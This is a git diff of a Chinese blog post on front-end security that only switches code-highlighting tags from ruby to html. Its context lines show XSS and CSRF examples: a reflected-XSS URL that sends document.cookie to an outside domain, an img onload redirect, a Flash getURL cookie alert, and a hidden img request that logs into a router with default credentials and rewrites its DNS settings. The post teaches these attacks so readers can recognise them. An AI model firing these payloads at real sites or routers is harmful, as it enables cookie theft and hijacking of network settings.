@@ -16,19 +16,19 @@ title: 前端安全的那些事
 
 ####页面中输入DOM节点####
 
-{% highlight ruby %}
+{% highlight html %}
 &lt;img src="xxx.gif" onload="window.location.href='johnqing.github.io'"&gt;
 {% endhighlight %}
 
 ####页面中输入js脚本####
 
-{% highlight ruby %}
+{% highlight html %}
 window.location.href='johnqing.github.io'
 {% endhighlight %}
 
 如果用户在，用户信息等form表单中输入
 
-{% highlight ruby %}
+{% highlight html %}
 window.location.href='johnqing.github.io'
 {% endhighlight %}
 
@@ -38,7 +38,7 @@ window.location.href='johnqing.github.io'
 
 用户在添加表单时，可输入如下代码：
 
-{% highlight ruby %}
+{% highlight html %}
 &lt;p&gt;
 {% endhighlight %}
 
@@ -50,13 +50,13 @@ window.location.href='johnqing.github.io'
 
 http://X.com/search.asp?q=ssss
 
-{% highlight ruby %}
+{% highlight html %}
 搜索结果：&lt;?php $_GET('q') ?&gt;
 {% endhighlight %}
 
 好了，俺偷偷伪造一个请求发送给该网站
 
-{% highlight ruby %}
+{% highlight html %}
 http://X.com/search.asp?q=&lt;script&gt;window.open("http://johnqing.github.io.cn?cookie="+document.cookie)&lt;/script&gt;
 {% endhighlight %}
 
@@ -66,7 +66,7 @@ http://X.com/search.asp?q=&lt;script&gt;window.open("http://johnqing.github.io.c
 
 当然flash作为web里一直存在的东东，当然也可以攻击。Flash中的getURL()动作，它可以使我们的页面重定向到函数指定的页面。
 
-{% highlight ruby %}
+{% highlight html %}
 getURL('javascript:alert(document.cookie)');
 {% endhighlight %}
 
@@ -96,7 +96,7 @@ getURL('javascript:alert(document.cookie)');
 
 代码如下：
 
-{% highlight ruby %}
+{% highlight html %}
 &lt;img style="display: none; " src="http://admin:admin@192.168.1.1/userRpm/LanDhcpServerRpm.htm?dhcpserver=1&amp;ip1=192.168.1.100&amp;ip2=192.168.1.199&amp;Lease=120&amp;gateway=0.0.0.0&amp;domain=&amp;dnsserver=&amp;dnsserver=8.8.8.8&amp;dnsserver2=8.8.8.8&amp;Save=%B1%A3+%B4%E6"&gt;
 {% endhighlight %}
 
